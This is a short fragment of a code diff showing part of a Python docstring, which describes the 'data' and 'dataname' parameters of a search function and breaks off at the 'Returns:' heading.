+            data: The data to be searched.
             dataname: The name (file / section) the data is from
 
         Returns:
